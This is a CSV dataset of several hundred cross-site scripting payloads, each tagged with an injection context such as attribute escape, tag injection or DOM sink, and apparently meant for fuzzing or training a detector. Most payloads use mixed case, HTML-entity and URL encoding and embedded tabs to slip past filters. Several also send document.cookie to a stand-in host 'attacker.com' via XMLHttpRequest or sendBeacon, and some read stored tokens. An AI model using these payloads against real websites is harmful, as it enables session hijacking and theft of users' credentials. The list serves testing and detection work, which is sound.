payload,context
""" onpagehide=alert(location.hash) """,attribute_escape
""" ong&#101;stur&#101;&#101;nd=confirm('XSS') """,attribute_escape
OnsEarCh=ConSolE.lOg('XSS'),event_handler
%22><mtext onended=confirm(document.domain)>,tag_injection
""" ><svG oNgeStuReeNd=ProMpt('XSS')>",attribute_escape
"eval(""XMLHttpRequest('//attacker.com/?c='+document.cookie)"")",dom_sink
\%22 ondragstart=console.log(document.domain)//,attribute_escape
<anImaTemOtiOn OnaNimAtiOniTerAtiOn=ConSolE.lOg('XSS')>,tag_injection
`><img src=x onrepeat=\u0061lert(location.hash)>,attribute_escape
&quot; onplaying=alert(location.hash) x=&quot;,attribute_escape
&quOt; onWebKitFulLscReeNchAngE=pRomPt('XSS') x=&quOt;,attribute_escape
"OnaUxcLicK=pRomPt&#40;StRinG.fRomChaRCoDe(88,83,83)&#41;",event_handler
<mtext src=x onended=confirm(document.domain)>,tag_injection
"'><Img srC=x onCut=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"<script>/*/prompt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"""%3E%3Cimg src=x oncopy=prompt(document.domain)%3E",attribute_escape
%27 ><svg ondragstart=console.log(document.domain)>,attribute_escape
' ontr&#97;nsition&#101;nd=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
"&#101;v&#97;l(""confirm(loc&#97;tion.h&#97;sh)"")",dom_sink
"setInterval(%22alert(document.cookie+%27&loc=%27+location.href)%22,100)",dom_sink
`%3E%3Cimg src=x ontouchend=console.log('XSS')%3E,attribute_escape
document.querySelector(%22body%22).innerHTML+=%22alert(localStorage.getItem(%27token%27))%22,dom_sink
document.querySelector(%22body%22).innerHTML+=%22console.log(document.cookie)%22,dom_sink
	onmous&#101;down=confirm('XSS'),event_handler
<script>Function(%27alert(1)%27)();</script>,script_injection
"onbeforecopy=alert&#40;String.fromCharCode(88,83,83)&#41;",event_handler
"Object.assign(window,{%22onblur%22:fetch})",dom_sink
"location.href=""javascr	ipt:eval(String.fromCharCode(88,83,83))""",dom_sink
"' %3E%3Csvg onpromptdismiss=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
&quOt; onPagEhiDe=ProMpt(doCumEnt.doMaiN) X=&QuoT;,attribute_escape
<meta/ontransitionstart=alert(location.hash)>,tag_injection
onanimationend=alert&#40;1&#41;,event_handler
"<!--><tr ontransitionend=prompt(String.fromCharCode(88,83,83))>",tag_injection
"<source
oninput=alert(location.hash)>",tag_injection
"""%3E%3Cimg src=x onpointermove=prompt('XSS')%3E",attribute_escape
<imG sRc=X oNpaGesWap=coNsoLe.Log(1)>,tag_injection
"""><img src=x onplaying=alert(String.fromCharCode(88,83,83))>",attribute_escape
"\"" OncLosE=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
onselect=javascr	ipt:prompt(location.hash),event_handler
javascr	ipt:console.log/**/(document.domain),js_uri
`><img src=x onh&#97;shch&#97;ng&#101;=prompt('XSS')>,attribute_escape
"__proto__[""oncopy""]=confirm(location.hash)",dom_sink
#{pRomPt('XSS')},template_injection
""" %3E%3Csvg ontoggle=prompt(1)%3E",attribute_escape
<scr	ipt>//alert(location.hash)</scr	ipt>,script_injection
{{#WitH aLerT('XSS')}}...{{/wiTh}},template_injection
"%22 ><svg onpointerover=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"ObjEct.asSigN(wIndOw,{""oNwaItiNg"":prOmpT})",dom_sink
	onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
"<ifr&#97;m&#101;
oninput=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
 ontransitionend=alert(location.hash),event_handler
onmouseenter=\u0061lert/**/(1),event_handler
onw&#101;bkit&#97;nim&#97;tion&#101;nd=confirm/***/(docum&#101;nt.dom&#97;in),event_handler
"setInterval(""fetch(document.cookie)"",100)",dom_sink
"LocAtiOn=""jaVasCriPt:ConFirM(dOcuMenT.dOmaIn)""",dom_sink
<boDy OniNvaLid=alErt(loCatIon.haSh)/>,tag_injection
<titl&#101; x=y onst&#97;ll&#101;d=&#97;l&#101;rt('XSS')>,tag_injection
"window[""console.log""](document.cookie)",dom_sink
"onpause=javascr	ipt:console.log(String.fromCharCode(88,83,83))",event_handler
%3Cbody onbeforecut=confirm(document.domain) onbeforecut=confirm(document.domain)%3E,tag_injection
%27 ontouchend=alert(%27XSS%27) %27,attribute_escape
\%27 oncopy=prompt(document.domain)//,attribute_escape
"(new Function(""eval('XSS')""))();",dom_sink
"__proto__[""ondblclick""]=confirm(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink
{{$On.ConStrUctOr('coNfiRm(DocUmeNt.CooKie)')()}},template_injection
"document.querySelector(""body"").innerHTML+=""XMLHttpRequest(document.cookie)""",dom_sink
"""><embed onmozfullscreenchange=console.log(document.domain)>",tag_injection
<titl&#101; onst&#97;ll&#101;d=&#97;l&#101;rt('XSS')>,tag_injection
<d&#101;t&#97;ils onr&#101;p&#101;&#97;t=prompt(1)/>,tag_injection
"""><img src=x onmouseover=confirm('XSS')>",attribute_escape
<xmp ontransitionend=\u0061lert(location.hash)/>,tag_injection
' ><svG oNseLecT=cOnsOle.loG(lOcaTioN.hAsh)>,attribute_escape
""" ongotpointercapture=\u0061lert(document.domain) """,attribute_escape
"document.write(""<img src=x onerror=XMLHttpRequest(document.domain)>"")",dom_sink
%22 onkeydown=prompt(%27XSS%27) %22,attribute_escape
"%27 ><svg onanimationiteration=console.log(String.fromCharCode(88,83,83))>",attribute_escape
%27 onbeforepaste=prompt(1) %27,attribute_escape
`><img src=x onfocus=\u0061lert(1)>,attribute_escape
"loc&#97;tion=""j&#97;v&#97;script:confirm(String.fromCh&#97;rCod&#101;(88,83,83))""",dom_sink
"' onmozfullscreenchange=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
"onsubmit=javascr	ipt:confirm(String.fromCharCode(88,83,83))",event_handler
%3Ciframe src=x oninput=console.log(location.hash)%3E,tag_injection
""" ><svG oNscRolLsnApcHanGe=AleRt('XSS')>",attribute_escape
"<script	>prompt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"' ><svG oNtoUchStaRt=ConFirM(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
{{pRomPt DocUmeNt.CooKie}},template_injection
<area onpageshow=prompt(%27XSS%27)>,tag_injection
"""><img src=x onbegin=alert(String.fromCharCode(88,83,83))>",attribute_escape
onkeyup=confirm/*x*/(location.hash),event_handler
onfocus=j&#97;v&#97;script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
"\"" onprompt&#97;ction=prompt(loc&#97;tion.h&#97;sh)//",attribute_escape
<%= prompt(%27XSS%27) %>,template_injection
"<script>window[%27confirm%27](String.fromCharCode(88,83,83))</script>",script_injection
'><Img srC=x onAniMatIonIteRatIon=coNsoLe.Log(1)>,attribute_escape
"<anImaTe
OnwEbkItfUllScrEenChaNge=coNsoLe.Log(1)>",tag_injection
"location=""javascript:prompt(document.domain)""",dom_sink
"""><img src=x onp&#97;g&#101;show=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape
`%3E%3Cimg src=x onbegin=confirm(location.hash)%3E,attribute_escape
\' onmous&#101;wh&#101;&#101;l=prompt('XSS')//,attribute_escape
`><img src=x onwheel=prompt('XSS')>,attribute_escape
onerror=console.log('XSS'),event_handler
onerror=javascr	ipt:console.log(location.hash),event_handler
&quot; ons&#101;l&#101;ct=confirm(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape
"""><img src=x onpageshow=console.log('XSS')>",attribute_escape
"SetTimEouT(""ProMpt(StRinG.fRomChaRCoDe(88,83,83))"",0)",dom_sink
%3Cembed onmozfullscreenchange=confirm(location.hash)/%3E,tag_injection
"<!--><ForM oNweBkiTfuLlsCreEncHanGe=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
<button ondragenter=\u0061lert(location.hash) ondragenter=\u0061lert(location.hash)>,tag_injection
<foRm Src=x OnsEarCh=ConSolE.lOg(1)>,tag_injection
"' ondr&#97;gov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
<script>/*/&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection
javascr	ipt:confirm/***/(document.domain),js_uri
"""%3E%3Cimg src=x onfocusout=console.log(location.hash)%3E",attribute_escape
\%27 onbeforetoggle=console.log(%27XSS%27)//,attribute_escape
"javascript:prompt/*x*/(String.fromCharCode(88,83,83))",js_uri
"ObjEct.asSigN(wIndOw,{""oNkeYdoWn"":feTch})",dom_sink
"<video onpaste=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
"EleMenT.sEtATtrIbuTe(""onCliCk"",""aLerT(lOcaTioN.hAsh)"")",dom_sink
<&#97;nim&#97;t&#101; onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(1) onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(1)>,tag_injection
"`%3E%3Cimg src=x onpointermove=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
"javascript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=confirm('XSS') )//%0D%0A%0d%0a",js_uri
<meta onsecuritypolicyviolation=prompt(%27XSS%27)>,tag_injection
"ObjEct.asSigN(wIndOw,{""oNbeForEinPut"":cOnsOle.loG})",dom_sink
"' onbegin=alert(String.fromCharCode(88,83,83)) '",attribute_escape
<img	onk&#101;ypr&#101;ss=consol&#101;.log(1)>,tag_injection
"\"" onended=prompt('XSS')//",attribute_escape
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=confirm(1)%3E"")",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;g&#101;sw&#97;p"":&#97;l&#101;rt})",dom_sink
%22><img src=x onpopstate=alert(%27XSS%27)>,attribute_escape
' ><svg ontouchend=console.log(1)>,attribute_escape
<embed src=x onmouseenter=confirm(%27XSS%27)>,tag_injection
"<t&#97;bl&#101;
ontouch&#101;nd=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
"&quOt; onTraNsiTioNruN=aLerT(STriNg.FroMChArCOde(88,83,83)) X=&QuoT;",attribute_escape
%22><embed onmozfullscreenchange=console.log(document.domain)>,tag_injection
"&quOt; onChaNge=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) x=&quOt;",attribute_escape
<maRquEe	OnsCroLlsNapChaNge=prOmpT(1)>,tag_injection
%27 ><svg onbeforecut=alert(document.domain)>,attribute_escape
onbeforecopy=console.log/*x*/(%27XSS%27),event_handler
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""&#101;v&#97;l(docum&#101;nt.dom&#97;in)"")",dom_sink
' ><svG oNtoUchEnd=coNsoLe.Log(1)>,attribute_escape
%3Cselect src=x onpointermove=prompt('XSS')%3E,tag_injection
"document.write(""<img src=x onerror=\u0061lert(document.domain)>"")",dom_sink
j&#97;v&#97;script:void(consol&#101;.log(docum&#101;nt.dom&#97;in)),js_uri
&quot; oncut=\u0061lert('XSS') x=&quot;,attribute_escape
"document.body.innerHTML=""%3Cimg src=x onerror=eval(document.cookie+'&loc='+location.href)%3E""",dom_sink
" onFulLscReeNchAngE=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))",event_handler
JavAscRipT:%0acOnsOle.loG('XSS'),js_uri
"__proto__[""onp&#97;st&#101;""]=XMLHttpR&#101;qu&#101;st('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink
""" ><svg ontouch&#101;nd=confirm('XSS')>",attribute_escape
"`><img src=x onanimationcancel=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
"\"" onk&#101;ypr&#101;ss=confirm('XSS')//",attribute_escape
\' onpromptdismiss=prompt(location.hash)//,attribute_escape
'><Img srC=x onPlaY=cOnfIrm('XSS')>,attribute_escape
'><img src=x on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
"OnbEfoRepAstE=jAvaScrIpt:alErt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"__proto__[""ontouchstart""]=prompt(localStorage.getItem('token'))",dom_sink
<vid&#101;o onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS') onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS')>,tag_injection
	ondr&#97;gov&#101;r=confirm('XSS'),event_handler
<SCRIPT>&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</SCRIPT>,script_injection
<button/onclick=console.log(1)>,tag_injection
&quot; onfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(1) x=&quot;,attribute_escape
"""%3E%3Cxmp onmousewheel=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
ontr&#97;nsitionrun=j&#97;v&#97;script:&#97;l&#101;rt(1),event_handler
"`><img src=x onbeforepaste=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"eval(""eval(document.cookie+'&loc='+location.href)"")",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""ondr&#97;g&#101;nt&#101;r"":f&#101;tch})",dom_sink
<meta ondrop=\u0061lert(document.domain) ondrop=\u0061lert(document.domain)>,tag_injection
on&#97;nim&#97;tion&#101;nd=consol&#101;.log&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
 onkeydown=alert('XSS'),event_handler
"\"" OnpRomPtdIsmIss=coNsoLe.Log('XSS')//",attribute_escape
\' ongesturestart=alert(1)//,attribute_escape
"<script
>alert(String.fromCharCode(88,83,83))</script>",script_injection
"&quot; onpoint&#101;rov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
%3Cdialog x=y onstalled=confirm('XSS')%3E,tag_injection
""" %3E%3Csvg onwheel=prompt('XSS')%3E",attribute_escape
"OnkEydOwn=jaVasCriPt:AleRt(StrIng.frOmCHarCodE(88,83,83))",event_handler
	onErrOr=ConSolE.lOg('XSS'),event_handler
"""><img src=x onclick=prompt('XSS')>",attribute_escape
"__proto__[""onp&#97;g&#101;r&#101;v&#101;&#97;l""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink
	onMouSeoVer=coNfiRm(DocUmeNt.DomAin),event_handler
"""%3E%3Cbase oninvalid=confirm(location.hash)%3E",tag_injection
`><img src=x ontouchmove=confirm(document.domain)>,attribute_escape
"""><img src=x onreset=console.log('XSS')>",attribute_escape
OnpOinTerRawUpdAte=coNsoLe.Log&#40;lOcaTioN.hAsh&#41;,event_handler
' ><svg ontransitionstart=confirm(document.domain)>,attribute_escape
`><img src=x oncontextmenu=\u0061lert(1)>,attribute_escape
"&quot; ondblclick=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
"\"" ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//",attribute_escape
document.write(%22<img src=x onerror=prompt(document.domain)>%22),dom_sink
<diAloG oNenDed=coNsoLe.Log(1) onEndEd=ConSolE.lOg(1)>,tag_injection
""" oNfoCusIn=ConSolE.lOg(LocAtiOn.HasH) """,attribute_escape
"WinDow[""XMLHTtpReqUesT""](1)",dom_sink
	oninvalid=confirm(1),event_handler
"onw&#101;bkittr&#97;nsition&#101;nd=j&#97;v&#97;script:&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
 onTraNsiTioNstArt=coNsoLe.Log(loCatIon.haSh),event_handler
onscrollsn&#97;pch&#97;ng&#101;=confirm/**/(docum&#101;nt.dom&#97;in),event_handler
'><img src=x onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt('XSS')>,attribute_escape
onmouseenter=javascript:alert('XSS'),event_handler
${&#97;l&#101;rt?n&#101;w()('docum&#101;nt.cooki&#101;')},template_injection
""" ongotpoint&#101;rc&#97;ptur&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
onkeydown=javascr	ipt:console.log(document.domain),event_handler
"`><img src=x oncut=prompt(String.fromCharCode(88,83,83))>",attribute_escape
location.href=%22javascript:prompt(location.hash)%22,dom_sink
"__pRotO__[""oNpoPstAte""]=ConFirM(1)",dom_sink
"""><math onplaying=console.log('XSS')>",tag_injection
<base/onkeydown=alert('XSS')>,tag_injection
"javascript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=\u0061lert(document.domain) )//%0D%0A%0d%0a",js_uri
"\"" ondrop=confirm(loc&#97;tion.h&#97;sh)//",attribute_escape
<m&#97;th onscroll&#101;nd=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"<area onended=prompt(String.fromCharCode(88,83,83)) onended=prompt(String.fromCharCode(88,83,83))>",tag_injection
"%3Cscript
%3Econfirm(document.domain)%3C/script%3E",script_injection
"<script>confirm`String.fromCharCode(88,83,83)`</script>",script_injection
JAVASCRIPT:alert('XSS'),js_uri
location.href=%22javascript:confirm(location.hash)%22,dom_sink
""" onpagehide=\u0061lert(location.hash) """,attribute_escape
`%3E%3Cimg src=x ongesturestart=alert(location.hash)%3E,attribute_escape
"""><Img srC=x onCut=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"""><img src=x onpopst&#97;t&#101;=&#97;l&#101;rt('XSS')>",attribute_escape
"""%3E%3Clisting onkeyup=alert(location.hash)%3E",tag_injection
"<svg
onpromptdismiss=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
"setInterval(""fetch(navigator.sendBeacon('//attacker.com',document.cookie))"",100)",dom_sink
&quot; onp&#97;g&#101;r&#101;v&#101;&#97;l=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape
 onErrOr=ConSolE.lOg('XSS'),event_handler
	onbeforematch=prompt(%27XSS%27),event_handler
<xmp ontransitionend=alert(location.hash) ontransitionend=alert(location.hash)>,tag_injection
"\%22 onended=alert(String.fromCharCode(88,83,83))//",attribute_escape
"<tiTle
onBluR=cOnsOle.loG(lOcaTioN.hAsh)>",tag_injection
OnmOusEenTer=prOmpT&#40;1&#41;,event_handler
OnmOusEwhEel=coNsoLe.Log/**/('XSS'),event_handler
<object onsubmit=confirm(location.hash)/>,tag_injection
"""%3E%3Cimg src=x onbeforematch=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
%22><img src=x onmousewheel=prompt(%27XSS%27)>,attribute_escape
""" ><svg onfocus=console.log(1)>",attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)""",dom_sink
"data:text/html,<scr	ipt>prompt(location.hash)</scr	ipt>",js_uri
' ><svG oNgoTpoIntErcAptUre=prOmpT('XSS')>,attribute_escape
""" %3E%3Csvg onauxclick=alert(1)%3E",attribute_escape
&#106;avascript:confirm('XSS'),js_uri
"\"" oninv&#97;lid=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//",attribute_escape
&quOt; onResEt=ProMpt(loCatIon.haSh) x=&quOt;,attribute_escape
<mt&#101;xt on&#101;nd&#101;d=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
<tr/onfocus=confirm(%27XSS%27)>,tag_injection
onfocusout=&#97;l&#101;rt&#40;'XSS'&#41;,event_handler
"ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
${cOnfIrm?neW()(''XSS'')},template_injection
"%3Cscript
%3Econfirm(location.hash)%3C/script%3E",script_injection
%27 ongestureend=prompt(1) %27,attribute_escape
%27><img src=x onfocusout=alert(location.hash)>,attribute_escape
' ><svg onpause=confirm('XSS')>,attribute_escape
"(neW FUncTioN(""ConFirM(bToa(doCumEnt.coOkiE))""))();",dom_sink
${confirm(docum&#101;nt.cooki&#101;)|n},template_injection
<blink src=x onkeypress=prompt(document.domain)>,tag_injection
%3Ctable onsearch=prompt(1)%3E,tag_injection
"ondblclick=javascript:prompt(String.fromCharCode(88,83,83))",event_handler
"<maTh
OnmOusEup=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection
<spAn OnbEfoRetOggLe=ProMpt(loCatIon.haSh)/>,tag_injection
	onb&#101;for&#101;input=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler
' ><svg onauxclick=console.log(1)>,attribute_escape
"\"" onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
' onerror=\u0061lert(1) ',attribute_escape
%27 ><svg onfocusin=console.log(location.hash)>,attribute_escape
"java
scr	ipt:console.log(1)",js_uri
"<xss
on&#101;nd=prompt('XSS')>",tag_injection
"oninput=alert(String.fromCharCode(88,83,83))",event_handler
<%= prompt('XSS') %>,template_injection
"location=""javascript:\u0061lert(String.fromCharCode(88,83,83))""",dom_sink
"""%3E%3Cmtext onended=confirm(document.domain)%3E",tag_injection
OnpAgeSwaP=cOnsOle.loG(lOcaTioN.hAsh),event_handler
 onanimationcancel=prompt(location.hash),event_handler
"<scRipT
>ConFirM(1)</ScrIpt>",script_injection
"OnbEfoRecOpy=alErt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"""><MatH oNdrAgoVer=prOmpT(1)>",tag_injection
' onpromptdismiss=prompt(location.hash) ',attribute_escape
%3C!--%3E%3Cmeta ondrop=alert(document.domain)%3E,tag_injection
"&quOt; onProMptActIon=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) x=&quOt;",attribute_escape
%3Canimate x=y onwebkitfullscreenchange=console.log(1)%3E,tag_injection
"\"" onpopstate=prompt(1)//",attribute_escape
"element.setAttribute(%22onclick%22,%22confirm(document.cookie)%22)",dom_sink
onpaste=alert&#40;1&#41;,event_handler
"\"" ontouchstart=confirm('XSS')//",attribute_escape
"`><img src=x oncopy=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
"\"" onreset=prompt(location.hash)//",attribute_escape
"<arEa OneNdeD=pRomPt(StrIng.frOmCHarCodE(88,83,83)) onEndEd=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
"document.write(""<img src=x onerror=eval(1)>"")",dom_sink
<&#97;udio x=y oninput=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
<baSe OniNvaLid=coNfiRm(LocAtiOn.HasH)>,tag_injection
""" oNanImaTioNstArt=alErt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
"&quot; onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
\' ontouchend=console.log('XSS')//,attribute_escape
